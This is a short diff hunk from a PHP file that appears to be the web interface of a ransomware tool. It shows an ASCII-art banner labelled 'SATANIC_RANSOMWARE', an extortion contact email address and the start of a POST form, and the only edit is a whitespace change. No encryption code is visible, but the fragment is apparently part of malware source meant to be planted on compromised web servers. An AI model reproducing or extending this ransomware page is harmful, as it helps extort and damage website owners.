@@ -235,7 +235,7 @@ switch ($_POST['method']) {
                  .mMMMMMMMMMMMMMMMMm`  omMMMMMMMMMMMMMMMMMMNy-  `dMMMMMMMMMMMMMMMMm`                
                   :NMMMNNNNmmmdhyys:    .dmNNNNNNNNNNNNNmmm+     .+ossyhhddmmmmNNm-                 
                    -:::--..``             `...------....``                  ``..-`                  
-       SATANIC_RANSOMWARE
+     SATANIC_RANSOMWARE
  -[ CONTACT : blackcyberanonymous666@gmail.com ]-
 </pre>
 <form action="" method="post" style=" text-align: center;">
